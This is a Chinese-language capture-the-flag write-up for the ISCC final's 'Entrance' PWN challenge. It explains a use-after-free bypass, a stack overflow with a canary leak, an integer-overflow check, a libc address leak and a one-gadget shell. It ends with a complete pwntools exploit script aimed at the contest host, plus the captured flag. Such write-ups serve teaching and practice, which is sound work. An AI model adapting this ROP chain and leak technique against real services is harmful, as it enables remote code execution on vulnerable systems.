# ISCC 决赛 - Entrance (PWN) Writeup

## 题目信息

- 题目：Entrance
- 类型：PWN
- 附件：`entrance` (ELF64, No PIE, Partial RELRO, Canary, NX)
- 远程：`39.96.193.120:10007`
- 提示：欢迎来到某个地下实验室入口! 终端亮起，闪烁着蓝光："请输入密钥。"一会验证你的令牌，一会设下门槛，最后还需要通过一轮陷阱。

## 程序分析

程序有 5 个关键函数，`main` 调用流程：

```
main() -> func1() -> func3() -> func_gate() -> func4()
```

### func1 + func2 — 令牌验证

```c
void func1() {
    puts("[System] Welcome to the system!");
    if (secret != 0x378)
        func2();
}
```

func2 存在 **Use-After-Free**：
1. `malloc(0x48)` 写入 `"hack"` 后 `free`
2. 用户输入 size（1~0x400），`malloc(size)` 分配新块
3. 用户输入 key，`strncmp(已释放块, "hack", 4)` 验证

**绕过**：输入 size=72（同 tcache 0x50 bin），复用同一 chunk，写入 `"hack"` 通过验证，设 `secret=0x378`。

### func3 — 栈溢出（核心漏洞）

```c
void func3() {
    char buf[24];           // rbp-0x20, 实际24字节
    if (secret == 0x378) {
        puts("hello");
        read(0, buf, 0x49); // 溢出！73字节读入24字节缓冲区
        printf("%s.congratulate to you", buf);  // 信息泄露
        read(0, buf, 0x49); // 再次溢出
        puts("It is good to see you ");
    }
}
```

栈布局：
```
rbp-0x20: buf[0..23]    (24 bytes)
rbp-0x08: canary        (8 bytes, LSB=0x00)
rbp+0x00: saved rbp     (8 bytes)
rbp+0x08: return addr   (8 bytes)
rbp+0x10: ROP space     (剩余24 bytes)
```

漏洞利用：
- **第一次 read**：24字节填充 + 1字节覆盖 canary 的 null LSB
- **printf**：%s 输出直到 null 字节，泄露 canary[1:7] + saved_rbp
- **第二次 read**：用正确 canary 构造 ROP 链

### func_gate — 整数溢出

```c
void func_gate() {
    int input;
    scanf("%d", &input);
    int result = input + 0x7fffffff;
    if (result == 0xf8a432eb) {
        allow_flag = 1;
    }
}
```

计算：`0xf8a432eb - 0x7fffffff = 0x78a432ec = 2023756524`

输入 `2023756524` 即可通过（利用有符号整数溢出）。

### func4 — 陷阱（UUID 加密）

读取32字符输入（去掉横线），对每个字符做 ROT+1（凯撒移位），格式化为 UUID 输出。

## 利用过程

### 关键发现

- 远程 libc 不是提供的 2.31，而是 **glibc 2.23**（Ubuntu 16.04）
  - 泄露 `puts` 地址低12位为 `0x6a0`，2.23 的 puts 偏移 `0x6f6a0`
- `system("/bin/sh")` 被拦截：`/bin/sh` 被替换为 wrapper，只输出提示信息
- **one-gadget 绕过**：func3 canary 校验通过后 `rax=0`，满足 `0x45226` 约束

### 偏移表 (glibc 2.23)

| 符号 | 偏移 |
|------|------|
| puts | 0x6f6a0 |
| system | 0x453a0 |
| /bin/sh | 0x18ce17 |
| one_gadget | 0x45226 |

### 利用步骤

**Stage 0**：绕过 func2
```
token length: 72
access key: hack
→ secret = 0x378
```

**Stage 1**：泄露 canary
```
第一次 read: 'A'*24 + 'B'  (25 bytes, 覆盖 canary null LSB)
printf 输出: 'A'*24 + 'B' + canary[1:7] + saved_rbp + ".congratulate to you"
→ 解析出 canary = 0x00 + leaked[0:7]
```

**Stage 2**：泄露 libc，返回 func3
```
第二次 read ROP:
  padding(24) + canary(8) + fake_rbp(8)
  + pop_rdi + puts@GOT + puts@plt + call_func3
→ 泄露 puts 地址，计算 libc_base
→ call func3 再次溢出
```

**Stage 3**：one-gadget 拿 shell
```
第一次 read: 'C'*24 (不碰 canary)
第二次 read ROP:
  padding(24) + canary(8) + fake_rbp(8)
  + one_gadget
→ canary check 后 rax=0，one_gadget execve("/bin/sh", ...) 成功
→ cat flag → ISCC{42acc744-0b81-4961-b93e-9ae06033b98e}
```

## 完整 Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Binary gadgets
pop_rdi    = 0x4018f3
puts_plt   = 0x401050
puts_got   = 0x404028
call_func3 = 0x401844

# glibc 2.23 offsets (detected from remote)
LIBC = {
    'puts':   0x6f6a0,
    'system': 0x453a0,
    'binsh':  0x18ce17,
    'one_gadget': 0x45226,
}

p = remote('39.96.193.120', 10007)

# === Stage 0: func2 bypass ===
p.recvuntil(b'length:')
p.sendline(b'72')
p.recvuntil(b'access key:')
p.sendline(b'hack')
p.recvuntil(b'hello')

# === Stage 1: leak canary ===
p.send(b'A' * 24 + b'B')
p.recvuntil(b'B')
leaked = p.recvuntil(b'.congratulate to you', drop=True)
canary = u64(b'\x00' + leaked[:7])
log.success(f'Canary: {hex(canary)}')

# === Stage 2: leak libc ===
rop1 = flat({
    0:  b'A' * 24,
    24: p64(canary),
    32: p64(0),
    40: p64(pop_rdi),
    48: p64(puts_got),
    56: p64(puts_plt),
    64: p64(call_func3),
}, filler=b'\x00', length=73)
p.send(rop1)

p.recvuntil(b'It is good to see you \n')
libc_base   = u64(p.recvn(6) + b'\x00\x00') - LIBC['puts']
one_gadget  = libc_base + LIBC['one_gadget']
log.success(f'libc base: {hex(libc_base)}')
p.recvline()

# === Stage 3: one-gadget ===
p.recvuntil(b'hello')
p.send(b'C' * 24)
p.recvuntil(b'.congratulate to you')

rop2 = flat({
    0:  b'C' * 24,
    24: p64(canary),
    32: p64(0),
    40: p64(one_gadget),
}, filler=b'\x00', length=73)
p.send(rop2)

# Receive flag
sleep(0.5)
p.sendline(b'cat /flag*')
p.interactive()
```

## Flag

```
ISCC{42acc744-0b81-4961-b93e-9ae06033b98e}
```
